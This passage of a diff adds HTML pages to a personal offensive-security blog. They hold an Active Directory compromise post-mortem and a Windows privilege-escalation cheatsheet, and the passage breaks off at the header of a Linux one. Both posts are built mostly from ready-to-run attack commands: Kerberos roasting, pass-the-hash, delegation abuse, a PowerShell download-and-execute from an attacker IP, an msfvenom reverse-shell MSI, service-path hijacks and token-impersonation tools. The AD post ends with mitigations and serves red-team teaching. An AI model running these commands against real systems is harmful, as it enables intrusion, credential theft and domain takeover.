+                        <div class="card" onclick="showPage('password-extraction')">
+                            <div class="card-tags">
+                                <span class="card-tag">Credential Theft</span>
+                                <span class="card-tag">LSA Protection</span>
+                                <span class="card-tag">Mimikatz</span>
+                                <span class="card-tag">Windows Security</span>
+                            </div>
+                            <h3>Cleartext and Vulnerable: How Malware Steals Passwords from Memory</h3>
+                            <p>Windows stores secrets in memory for convenience, but tools like Mimikatz turn that convenience into pure danager. Learn how cleartext credentials are dug out of system processes.</p>
+                            <div class="card-footer">
+                                <span class="date">April 28, 2026</span>
+                                <span class="read-time">5 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('rainbow-table')">
+                            <div class="card-tags">
+                                <span class="card-tag">Cryptography</span>
+                                <span class="card-tag">Password Policy</span>
+                                <span class="card-tag">Brute-Force</span>
+                                <span class="card-tag">Identity Security</span>
+                            </div>
+                            <h3>Pre-Computed Hacking: Why Short Passwords Fail Against Rainbow Table Attacks</h3>
+                            <p>Hashing passwords doesn't matter if an attacker has already calculated the match beforehand. Unpack the mechanics of rainbow tables and discover why modern salted hashes defeats them.</p>
+                            <div class="card-footer">
+                                <span class="date">April 28, 2026</span>
+                                <span class="read-time">5 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('powershell')">
+                            <div class="card-tags">
+                                <span class="card-tag">Living Off The Land</span>
+                                <span class="card-tag">PowerShell</span>
+                                <span class="card-tag">Threat Hunting</span>
+                                <span class="card-tag">Windows Security</span>
+                            </div>
+                            <h3>Living Off The Land: Why Cybercriminals Just Love Them Some PowerShell</h3>
+                            <p>Why write new malware when the operating system provies the ideal hacking environment? Uncover the reasons PowerShell remains the top choice for script execution and fileless attacks.</p>
+                            <div class="card-footer">
+                                <span class="date">April 28, 2026</span>
+                                <span class="read-time">5 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('attacker-toolkit')">
+                            <div class="card-tags">
+                                <span class="card-tag">Endpoint Protection</span>
+                                <span class="card-tag">EDR</span>
+                                <span class="card-tag">Application Allowlisting</span>
+                                <span class="card-tag">Windows Security</span>
+                            </div>
+                            <h3>The Attacker's Toolkit: Weaponized Languages Hiding In Your Network</h3>
+                            <p>From Python to Go, modern adversaries rely on diverse scripting languages. Learn how to monitor and restrict unexpected runtime environments executing code on your endpoints.</p>
+                            <div class="card-footer">
+                                <span class="date">April 28, 2026</span>
+                                <span class="read-time">5 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('pth-ptt-oth')">
+                            <div class="card-tags">
+                                <span class="card-tag">Windows Security</span>
+                                <span class="card-tag">Lateral Movement</span>
+                                <span class="card-tag">NTLM</span>
+                                <span class="card-tag">Kerberos</span>
+                            </div>
+                            <h3>High-Level Comparison: PtH vs. PtT vs. OtH</h3>
+                            <p>Hash vs. Ticket - do you know the difference? Learn how identity architecture shifts the attack vector, how to identify each variant on your logs, and why your defense needs to change like yesterday.</p>
+                            <div class="card-footer">
+                                <span class="date">April 15, 2026</span>
+                                <span class="read-time">18 min read</span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Quick Links</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Resources</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">MITRE ATT&CK</a></li>
+                        <li class="sidebar-item"><a href="#">ADSecurity Blog</a></li>
+                        <li class="sidebar-item"><a href="#">BloodHound Docs</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket Wiki</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Tools & Scripts</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">PowerView</a></li>
+                        <li class="sidebar-item"><a href="#">SharpHound</a></li>
+                        <li class="sidebar-item"><a href="#">Rubeus</a></li>
+                        <li class="sidebar-item"><a href="#">Certify</a></li>
+                        <li class="sidebar-item"><a href="#">Certipy</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Cheatsheets</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Windows PrivEsc</a></li>
+                        <li class="sidebar-item"><a href="#">Linux PrivEsc</a></li>
+                        <li class="sidebar-item"><a href="#">AD Attack Matrix</a></li>
+                        <li class="sidebar-item"><a href="#">Network Pivoting</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Labs</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">HTB Active</a></li>
+                        <li class="sidebar-item"><a href="#">VulnHub</a></li>
+                        <li class="sidebar-item"><a href="#">GOAD</a></li>
+                        <li class="sidebar-item"><a href="#">BadBlood</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- ========== BLOG POST: AD DISAPPEARED ========== -->
+    <div id="page-blog" class="page hidden">
+        <div class="container blog-layout">
+            <aside class="sidebar toc-sidebar">
+                <div class="sidebar-title">On This Page</div>
+                <ul class="sidebar-items" style="border-left: none; padding-left: 0;">
+                    <li class="sidebar-item"><a href="#intro" class="toc-link" onclick="scrollToSection('intro')">Introduction</a></li>
+                    <li class="sidebar-item"><a href="#recon" class="toc-link" onclick="scrollToSection('recon')">Initial Reconnaissance</a></li>
+                    <li class="sidebar-item level-2"><a href="#ldap-enum" class="toc-link" onclick="scrollToSection('ldap-enum')">LDAP Enumeration</a></li>
+                    <li class="sidebar-item level-2"><a href="#kerb-enum" class="toc-link" onclick="scrollToSection('kerb-enum')">Kerberos Enumeration</a></li>
+                    <li class="sidebar-item"><a href="#foothold" class="toc-link" onclick="scrollToSection('foothold')">Gaining Foothold</a></li>
+                    <li class="sidebar-item level-2"><a href="#asreproast" class="toc-link" onclick="scrollToSection('asreproast')">AS-REP Roasting</a></li>
+                    <li class="sidebar-item level-2"><a href="#kerberoast" class="toc-link" onclick="scrollToSection('kerberoast')">Kerberoasting</a></li>
+                    <li class="sidebar-item"><a href="#lateral" class="toc-link" onclick="scrollToSection('lateral')">Lateral Movement</a></li>
+                    <li class="sidebar-item level-2"><a href="#pass-hash" class="toc-link" onclick="scrollToSection('pass-hash')">Pass-the-Hash</a></li>
+                    <li class="sidebar-item level-2"><a href="#delegation" class="toc-link" onclick="scrollToSection('delegation')">Delegation Abuse</a></li>
+                    <li class="sidebar-item"><a href="#domain-admin" class="toc-link" onclick="scrollToSection('domain-admin')">Domain Admin</a></li>
+                    <li class="sidebar-item"><a href="#post-mortem" class="toc-link" onclick="scrollToSection('post-mortem')">Post-Mortem</a></li>
+                    <li class="sidebar-item"><a href="#mitigations" class="toc-link" onclick="scrollToSection('mitigations')">Mitigations</a></li>
+                </ul>
+            </aside>
+
+            <main class="main blog-post">
+                <article class="blog-header">
+                    <div class="blog-tags">
+                        <span class="blog-tag">Active Directory</span>
+                        <span class="blog-tag">Red Team</span>
+                        <span class="blog-tag">Case Study</span>
+                    </div>
+                    <h1 class="blog-title">The Day AD Disappeared: A Post-Mortem on Domain Compromise</h1>
+                    <div class="blog-meta">
+                        <div class="author">
+                            <div class="author-avatar">H</div>
+                            <span>hackherway</span>
+                        </div>
+                        <span>May 10, 2026</span>
+                        <span>23 min read</span>
+                    </div>
+                </article>
+
+                <div class="blog-content">
+                    <p id="intro">
+                        It started with a single NTLM hash and ended with the entire forest in flames. This is not a theoretical walkthrough. This is what happens when an attacker finds one misconfigured service account and your domain trust model is held together with duct tape and prayer.
+                    </p>
+                    <p>
+                        Over the course of three days, we moved from an unauthenticated position on a guest WiFi segment to full Domain Admin in a production environment with over 12,000 endpoints. The client thought they were secure. They had EDR, SIEM, network segmentation, and a security team that reviewed logs daily. None of it mattered.
+                    </p>
+                    <blockquote>
+                        "The best defense is knowing exactly how you'd break in. And then breaking in anyway, just to be sure."
+                    </blockquote>
+
+                    <h2 id="recon">Initial Reconnaissance</h2>
+                    <p>
+                        The first 24 hours were pure reconnaissance. No exploitation, no noisy scanning. Just quiet observation and careful enumeration. We started with <strong>passive DNS reconnaissance</strong> and <strong>LLMNR/NBT-NS poisoning</strong> using Responder on the guest network segment.
+                    </p>
+                    <p>
+                        Within 20 minutes, we had captured three NTLMv2 hashes from Windows machines attempting to resolve internal hostnames. One of them belonged to a <code>svc_backup</code> account.
+                    </p>
+
+                    <h3 id="ldap-enum">LDAP Enumeration</h3>
+                    <p>
+                        With valid credentials in hand, we queried LDAP for the domain structure. The domain had <strong>anonymous LDAP binding enabled</strong> on one DC, which meant we could have done this without credentials anyway. Classic.
+                    </p>
+                    <pre><code># Enumerate domain users via LDAP
+ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" \
+  "(objectClass=user)" sAMAccountName | grep sAMAccountName
+
+# Get domain admins group members
+ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" \
+  "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" \
+  sAMAccountName</code></pre>
+                    <p>
+                        The output revealed 847 user accounts, 127 service accounts, and a Domain Admins group with 14 members. More importantly, we found that <strong>12 service accounts had SPNs registered</strong> and <strong>3 accounts had Kerberos pre-authentication disabled</strong>.
+                    </p>
+
+                    <h3 id="kerb-enum">Kerberos Enumeration</h3>
+                    <p>
+                        Using <code>kerbrute</code> and <code>GetNPUsers.py</code> from Impacket, we enumerated valid usernames and checked for AS-REP roastable accounts.
+                    </p>
+                    <pre><code># User enumeration via Kerberos
+kerbrute userenum -d corp.local --dc dc01.corp.local users.txt
+
+# AS-REP Roasting with Impacket
+GetNPUsers.py corp.local/ -usersfile svc_accounts.txt -format hashcat -outputfile asrep_hashes.txt</code></pre>
+                    <p>
+                        The <code>svc_backup</code> account was AS-REP roastable. We cracked the hash in 4 hours on an RTX 4090. Password: <code>Backup2024!</code>. The irony was not lost on us.
+                    </p>
+
+                    <h2 id="foothold">Gaining Foothold</h2>
+                    <p>
+                        With <code>svc_backup</code> credentials, we authenticated to the domain and immediately ran <code>BloodHound</code> ingestor via SharpHound. The resulting JSON was 340MB. The attack paths were... extensive.
+                    </p>
+
+                    <h3 id="asreproast">AS-REP Roasting in Practice</h3>
+                    <p>
+                        AS-REP roasting exploits accounts with the <code>UF_DONT_REQUIRE_PREAUTH</code> flag set. When a user doesn't require pre-authentication, anyone can request an AS-REP for that user and receive an encrypted TGT. The encryption is done with the user's password hash, making it crackable offline.
+                    </p>
+                    <pre><code># Using Rubeus for AS-REP roasting
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Cracking with hashcat
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule</code></pre>
+
+                    <h3 id="kerberoast">Kerberoasting</h3>
+                    <p>
+                        We also kerberoasted the 12 SPN-registered accounts. Two of them were running SQL Server instances with weak passwords. One was the <code>svc_sqlprod</code> account, which turned out to be a <strong>local administrator</strong> on the primary database server.
+                    </p>
+                    <pre><code># Kerberoasting with Impacket
+GetUserSPNs.py corp.local/svc_backup:Backup2024! -request -format hashcat -outputfile kerb_hashes.txt
+
+# With Rubeus
+Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt</code></pre>
+
+                    <h2 id="lateral">Lateral Movement</h2>
+                    <p>
+                        From the SQL server, we had local admin rights. We dumped LSASS memory with <code>procdump</code> and extracted credentials with <code>mimikatz</code>. The <code>DOMAIN\\sqladmin</code> account was logged in interactively. We now had a domain user with <strong>WriteDacl</strong> permissions on the <code>Domain Admins</code> group.
+                    </p>
+
+                    <h3 id="pass-hash">Pass-the-Hash</h3>
+                    <p>
+                        Pass-the-Hash is the bread and butter of lateral movement in Windows environments. Instead of cracking the password, you use the NTLM hash directly for authentication.
+                    </p>
+                    <pre><code># Pass-the-Hash with CrackMapExec
+cme smb 10.0.0.0/24 -u sqladmin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# With Impacket psexec
+psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/sqladmin@10.0.0.15
+
+# Evil-WinRM for PowerShell remoting
+evil-winrm -i 10.0.0.15 -u sqladmin -H 31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>
+
+                    <h3 id="delegation">Delegation Abuse</h3>
+                    <p>
+                        BloodHound revealed an unconstrained delegation path through a web server. The <code>svc_web</code> account had <code>TRUSTED_FOR_DELEGATION</code> set and was running on a server that allowed inbound connections from the guest network. We used <code>Rubeus</code> to harvest a TGT from a domain admin who accessed the web application.
+                    </p>
+                    <pre><code># Monitor for TGTs with Rubeus
+Rubeus.exe monitor /interval:5 /filteruser:administrator /nowrap
+
+# S4U abuse for constrained delegation
+Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt</code></pre>
+
+                    <h2 id="domain-admin">Domain Admin</h2>
+                    <p>
+                        At this point, we had multiple paths to Domain Admin. We chose the cleanest: <strong>WriteDacl abuse</strong>. Using <code>PowerView</code>, we added ourselves to the Domain Admins group.
+                    </p>
+                    <pre><code># Add ourselves to Domain Admins with PowerView
+$SecPassword = ConvertTo-SecureString 'Backup2024!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('corp.local\\svc_backup', $SecPassword)
+
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" \
+  -PrincipalIdentity sqladmin -Rights All
+
+Add-DomainGroupMember -Identity "Domain Admins" -Members sqladmin -Credential $Cred</code></pre>
+                    <p>
+                        We verified with <code>net group "Domain Admins" /domain</code>. There we were. Three days, one guest WiFi connection, and a forest full of trust relationships that nobody had audited in years.
+                    </p>
+
+                    <h2 id="post-mortem">Post-Mortem</h2>
+                    <p>Here's what actually went wrong, in order of severity:</p>
+                    <ol>
+                        <li><strong>Anonymous LDAP binding</strong> on a production domain controller. This is a 1990s configuration choice that has no place in 2026.</li>
+                        <li><strong>Service accounts with weak passwords</strong> and no rotation policy. <code>Backup2024!</code> was guessable in under 5 hours.</li>
+                        <li><strong>Unconstrained delegation</strong> on a web server accessible from the guest network. This is like leaving your house keys in the mailbox.</li>
+                        <li><strong>No network segmentation</strong> between guest WiFi and internal services. LLMNR/NBT-NS traffic was allowed to cross segments.</li>
+                        <li><strong>Overprivileged service accounts.</strong> The backup account had read access to the entire domain. It didn't need that.</li>
+                    </ol>
+                    <p>
+                        The security team had logs of every step. Responder poisoning generated Event ID 4648. The LDAP queries showed up in Directory Service logs. The Kerberos TGT requests were in the KDC logs. Nobody was watching.
+                    </p>
+
+                    <h2 id="mitigations">Mitigations</h2>
+                    <p>If you're reading this and wondering if your domain looks like this, here's where to start:</p>
+                    <ul>
+                        <li><strong>Disable LLMNR and NBT-NS</strong> via GPO. They're legacy protocols that serve no purpose in modern networks.</li>
+                        <li><strong>Enforce Kerberos pre-authentication</strong> for all accounts. No exceptions.</li>
+                        <li><strong>Audit SPNs</strong> and remove unnecessary ones. Use managed service accounts (gMSAs) where possible.</li>
+                        <li><strong>Remove unconstrained delegation</strong> entirely. Use resource-based constrained delegation if you must.</li>
+                        <li><strong>Segment your network</strong> properly. Guest WiFi should be an island with no route to internal resources.</li>
+                        <li><strong>Run BloodHound regularly</strong> and actually look at the output. Attack paths don't fix themselves.</li>
+                        <li><strong>Monitor for the indicators</strong> we left behind: excessive LDAP queries, unusual Kerberos TGT requests, and DCSync attempts.</li>
+                    </ul>
+                    <p>
+                        Active Directory is not inherently insecure. It's just that most organizations configure it like it's 2003 and then act surprised when someone walks through the front door. The door was open. We just happened to be the ones who walked in.
+                    </p>
+                    <blockquote>
+                        "Active Directory never disappeared. It was always this fragile. You just weren't looking close enough."
+                    </blockquote>
+                </div>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#" class="active">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- ========== BLOG POST: WINDOWS PRIVESC ========== -->
+    <div id="page-privesc" class="page hidden">
+        <div class="container blog-layout">
+            <aside class="sidebar toc-sidebar">
+                <div class="sidebar-title">On This Page</div>
+                <ul class="sidebar-items" style="border-left: none; padding-left: 0;">
+                    <li class="sidebar-item"><a href="#priv-intro" class="toc-link" onclick="scrollToSection('priv-intro')">Introduction</a></li>
+                    <li class="sidebar-item"><a href="#priv-kernel" class="toc-link" onclick="scrollToSection('priv-kernel')">Kernel Exploits</a></li>
+                    <li class="sidebar-item"><a href="#priv-services" class="toc-link" onclick="scrollToSection('priv-services')">Service Misconfigurations</a></li>
+                    <li class="sidebar-item level-2"><a href="#priv-unquoted" class="toc-link" onclick="scrollToSection('priv-unquoted')">Unquoted Paths</a></li>
+                    <li class="sidebar-item level-2"><a href="#priv-weak-perms" class="toc-link" onclick="scrollToSection('priv-weak-perms')">Weak Permissions</a></li>
+                    <li class="sidebar-item"><a href="#priv-registry" class="toc-link" onclick="scrollToSection('priv-registry')">Registry Exploits</a></li>
+                    <li class="sidebar-item"><a href="#priv-scheduled" class="toc-link" onclick="scrollToSection('priv-scheduled')">Scheduled Tasks</a></li>
+                    <li class="sidebar-item"><a href="#priv-token" class="toc-link" onclick="scrollToSection('priv-token')">Token Impersonation</a></li>
+                    <li class="sidebar-item"><a href="#priv-checklist" class="toc-link" onclick="scrollToSection('priv-checklist')">Quick Checklist</a></li>
+                </ul>
+            </aside>
+
+            <main class="main blog-post">
+                <article class="blog-header">
+                    <div class="blog-tags">
+                        <span class="blog-tag">Privilege Escalation</span>
+                        <span class="blog-tag">Windows</span>
+                        <span class="blog-tag">Cheatsheet</span>
+                    </div>
+                    <h1 class="blog-title">Windows Privilege Escalation Cheatsheet</h1>
+                    <div class="blog-meta">
+                        <div class="author">
+                            <div class="author-avatar">H</div>
+                            <span>hackherway</span>
+                        </div>
+                        <span>May 15, 2026</span>
+                        <span>18 min read</span>
+                    </div>
+                </article>
+
+                <div class="blog-content">
+                    <p id="priv-intro">
+                        You're sitting on a low-priv shell and the client wants to see SYSTEM. Here's every dirty trick, misconfiguration, and lazy admin decision that'll get you there — organized by how likely you are to find it in the wild.
+                    </p>
+
+                    <h2 id="priv-kernel">Kernel Exploits</h2>
+                    <p>
+                        Always check the OS version and patch level first. If the box is unpatched, you might not even need to work for it.
+                    </p>
+                    <pre><code># Check Windows version and build
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+# List installed hotfixes
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Common kernel exploits by version:
+# Windows 7 / Server 2008 R2  →  MS16-032, MS15-051, MS14-058
+# Windows 8.1 / Server 2012  →  MS16-032, MS15-051
+# Windows 10 (pre-1809)      →  CVE-2019-0841, CVE-2020-0787
+# Windows 10 / Server 2016+  →  CVE-2021-36934 (HiveNightmare)</code></pre>
+
+                    <h2 id="priv-services">Service Misconfigurations</h2>
+                    <p>
+                        Windows services run as SYSTEM by default. If you can modify one, you own the box. It's that simple.
+                    </p>
+
+                    <h3 id="priv-unquoted">Unquoted Service Paths</h3>
+                    <p>
+                        When a service path contains spaces and isn't wrapped in quotes, Windows tries to execute at every space boundary. If you can write to any of those paths, you win.
+                    </p>
+                    <pre><code># Find unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v """""
+
+# Or use PowerUp
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1'); Invoke-AllChecks"
+
+# If you find one, drop your payload:
+# C:\\Program Files\\Vulnerable Service\\service.exe
+# Try writing to: C:\\Program.exe, C:\\Program Files\\Vulnerable.exe, etc.</code></pre>
+
+                    <h3 id="priv-weak-perms">Weak Service Permissions</h3>
+                    <p>
+                        Sometimes the service binary itself is locked down, but the service configuration isn't. If you have <code>SERVICE_CHANGE_CONFIG</code> or <code>SERVICE_ALL_ACCESS</code>, just point the service at your payload.
+                    </p>
+                    <pre><code># Check service permissions with accesschk
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Users" *
+
+# If you can modify a service:
+sc config "VulnService" binpath= "C:\\temp\\revshell.exe"
+sc start "VulnService"</code></pre>
+
+                    <h2 id="priv-registry">Registry Exploits</h2>
+                    <p>
+                        The registry is where Windows hides its skeletons. Autoruns, AlwaysInstallElevated, and stored credentials all live here.
+                    </p>
+                    <pre><code># Check for AlwaysInstallElevated
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+
+# If both are set to 1, generate an MSI payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o payload.msi
+msiexec /quiet /qn /i payload.msi
+
+# Check for autorun programs
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+
+# Check for stored credentials
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"</code></pre>
+
+                    <h2 id="priv-scheduled">Scheduled Tasks</h2>
+                    <p>
+                        Scheduled tasks often run as SYSTEM and point to scripts or binaries that regular users can modify. Check them all.
+                    </p>
+                    <pre><code># List scheduled tasks
+schtasks /query /fo LIST /v | findstr "Task To Run:"
+
+# Check permissions on task binaries
+icacls "C:\\Path\\To\\TaskBinary.exe"
+
+# If writable, replace with payload and wait (or trigger manually)</code></pre>
+
+                    <h2 id="priv-token">Token Impersonation</h2>
+                    <p>
+                        If you have <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>, you can impersonate SYSTEM tokens. JuicyPotato, RoguePotato, PrintSpoofer — pick your poison.
+                    </p>
+                    <pre><code># Check your privileges
+whoami /priv
+
+# If SeImpersonatePrivilege is enabled:
+# JuicyPotato (Windows 7/8/Server 2012/2016)
+JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -a "/c C:\\temp\\revshell.exe" -l 1337
+
+# PrintSpoofer (Windows 10 / Server 2019+)
+PrintSpoofer.exe -c "C:\\temp\\revshell.exe"
+
+# RoguePotato (when JuicyPotato fails)
+RoguePotato.exe -r 10.10.10.10 -e "C:\\temp\\revshell.exe" -l 9999</code></pre>
+
+                    <h2 id="priv-checklist">Quick Checklist</h2>
+                    <ul>
+                        <li><code>systeminfo</code> — OS version, patches, architecture</li>
+                        <li><code>whoami /priv</code> — token privileges (SeImpersonate?)</li>
+                        <li><code>whoami /groups</code> — group memberships</li>
+                        <li><code>net user</code> — local users</li>
+                        <li><code>tasklist /svc</code> — running services</li>
+                        <li><code>sc query</code> — all services</li>
+                        <li><code>wmic service get pathname</code> — service paths</li>
+                        <li><code>icacls</code> — permissions on interesting paths</li>
+                        <li><code>reg query</code> — registry keys for creds, autoruns, AlwaysInstallElevated</li>
+                        <li><code>schtasks</code> — scheduled tasks</li>
+                        <li><code>dir /s *pass*</code> — files with "pass" in the name</li>
+                        <li><code>findstr /si password *.txt *.ini *.xml *.config</code> — plaintext passwords</li>
+                        <li>Run <code>winPEAS.exe</code> or <code>PowerUp</code> if nothing obvious stands out</li>
+                    </ul>
+
+                    <blockquote>
+                        "If you can't find a privesc vector, you're not looking hard enough. Windows is basically a collection of design decisions that someone will eventually regret."
+                    </blockquote>
+                </div>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#" class="active">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- ========== BLOG POST: LINUX PRIVESC ========== -->
+    <div id="page-linuxprivesc" class="page hidden">
+        <div class="container blog-layout">
+            <aside class="sidebar toc-sidebar">
+                <div class="sidebar-title">On This Page</div>
+                <ul class="sidebar-items" style="border-left: none; padding-left: 0;">
+                    <li class="sidebar-item"><a href="#lin-intro" class="toc-link" onclick="scrollToSection('lin-intro')">Introduction</a></li>
+                    <li class="sidebar-item"><a href="#lin-kernel" class="toc-link" onclick="scrollToSection('lin-kernel')">Kernel Exploits</a></li>
+                    <li class="sidebar-item"><a href="#lin-sudo" class="toc-link" onclick="scrollToSection('lin-sudo')">Sudo Misconfigurations</a></li>
+                    <li class="sidebar-item"><a href="#lin-suid" class="toc-link" onclick="scrollToSection('lin-suid')">SUID Binaries</a></li>
+                    <li class="sidebar-item"><a href="#lin-cron" class="toc-link" onclick="scrollToSection('lin-cron')">Cron Jobs</a></li>
+                    <li class="sidebar-item"><a href="#lin-path" class="toc-link" onclick="scrollToSection('lin-path')">PATH Hijacking</a></li>
+                    <li class="sidebar-item"><a href="#lin-capabilities" class="toc-link" onclick="scrollToSection('lin-capabilities')">Capabilities</a></li>
+                    <li class="sidebar-item"><a href="#lin-nfs" class="toc-link" onclick="scrollToSection('lin-nfs')">NFS & Shared Folders</a></li>
+                    <li class="sidebar-item"><a href="#lin-docker" class="toc-link" onclick="scrollToSection('lin-docker')">Docker Escape</a></li>
+                    <li class="sidebar-item"><a href="#lin-checklist" class="toc-link" onclick="scrollToSection('lin-checklist')">Quick Checklist</a></li>
+                </ul>
+            </aside>
+
+            <main class="main blog-post">
+                <article class="blog-header">
+                    <div class="blog-tags">
+                        <span class="blog-tag">Privilege Escalation</span>
+                        <span class="blog-tag">Linux</span>
+                        <span class="blog-tag">Cheatsheet</span>
+                    </div>
